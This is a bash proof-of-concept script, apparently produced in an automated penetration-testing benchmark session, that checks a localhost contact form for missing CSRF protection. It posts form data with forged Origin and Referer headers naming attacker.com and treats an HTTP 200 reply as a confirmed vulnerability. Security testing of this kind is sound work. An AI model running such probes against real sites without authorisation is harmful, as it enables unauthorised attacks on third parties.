#!/bin/bash
# POC: CSRF attack against contact form - demonstrates lack of CSRF token validation and cross-origin request acceptance
# Target: ./repo
# Created: 2025-11-07T16:38:18.016Z
# Session: benchmark-XBEN-097-24-mhp2dzly

# CSRF Vulnerability POC - Contact Form
# This script demonstrates the lack of CSRF protection on the contact form
# by sending a POST request from a different origin without CSRF token validation

TARGET_URL="${1:-http://localhost:3000/contact.php}"
ATTACKER_ORIGIN="http://attacker.com"

echo "[*] CSRF Vulnerability POC - Contact Form"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Send POST request from attacker origin without CSRF token
echo "[*] Test 1: Sending cross-origin POST request without CSRF token"
echo "[*] Command:"
echo "curl -v -H \"Origin: $ATTACKER_ORIGIN\" -H \"Referer: $ATTACKER_ORIGIN/csrf.html\" -X POST $TARGET_URL -d \"name=CSRF_TEST&email=csrf@test.com&message=csrf_vulnerability_test\""
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -H "Origin: $ATTACKER_ORIGIN" -H "Referer: $ATTACKER_ORIGIN/csrf.html" -X POST "$TARGET_URL" -d "name=CSRF_TEST&email=csrf@test.com&message=csrf_vulnerability_test")

# Extract HTTP status code (last line)
HTTP_STATUS=$(echo "$RESPONSE" | tail -n1)
# Extract response body (everything except last line)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_STATUS"
echo "[*] Response Body:"
echo "$RESPONSE_BODY"
echo ""

# Check if request was accepted
if [[ "$HTTP_STATUS" == "200" ]]; then
    echo "[+] SUCCESS: Cross-origin POST request was accepted (HTTP 200)"
    echo "[+] VULNERABILITY CONFIRMED: No CSRF protection detected"
    echo "[+] Form accepted request without CSRF token validation"
    exit 0
elif [[ "$HTTP_STATUS" == "403" ]] || [[ "$HTTP_STATUS" == "419" ]]; then
    echo "[-] CSRF protection detected: Request rejected (HTTP $HTTP_STATUS)"
    exit 1
else
    echo "[*] Unexpected response code: $HTTP_STATUS"
    echo "[*] This might indicate CSRF protection or server error"
    exit 1
fi